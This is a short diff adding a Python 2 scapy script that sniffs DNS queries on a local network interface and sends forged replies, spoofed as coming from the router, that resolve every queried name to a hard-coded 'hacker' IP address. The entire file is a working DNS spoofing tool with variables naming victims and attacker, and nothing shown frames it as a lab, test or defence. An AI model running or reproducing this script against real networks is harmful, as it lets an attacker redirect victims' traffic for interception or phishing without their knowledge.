@@ -0,0 +1,27 @@
#!/usr/bin/python


from scapy.all import *
import sys


hacker_ip='192.168.1.4'
my_mac=open('/sys/class/net/eth0/address').readline()
hacker_mac=my_mac.split('\n')
router_ip='192.168.1.1'
udp=53

def PacketHandler(pkt):

	if pkt.haslayer(DNSQR) and (pkt.payload.src not in router_ip): 
		dns_query_id=pkt.getlayer(DNS).id
		victim_mac=pkt.src
		victim_ip=pkt.payload.src
		udp_dport=pkt.getlayer(UDP).sport
		victim_query_name=pkt.getlayer(UDP).payload.qd.qname
		dns_response=Ether(src=hacker_mac[0],dst=victim_mac)/IP(src=router_ip,dst=victim_ip)/UDP(sport=53,dport=udp_dport)/DNS(id=dns_query_id,qr=1L,aa=0L,tc=0L,rd=1L,ra=1L,z=0L,opcode='QUERY',rcode='ok',qdcount=1,ancount=1,nscount=0,qd=DNSQR(qname=victim_query_name),an=DNSRR(rrname=victim_query_name,rdata=hacker_ip,ttl=73))
		sendp(dns_response,verbose=0)
		print victim_ip+":"+str(udp_dport)+" > "+router_ip+":"+str(udp)+" -> "+victim_query_name
print "DNS Poisoning started on eth0"
	
sniff(iface="eth0",count=10000,prn=PacketHandler)
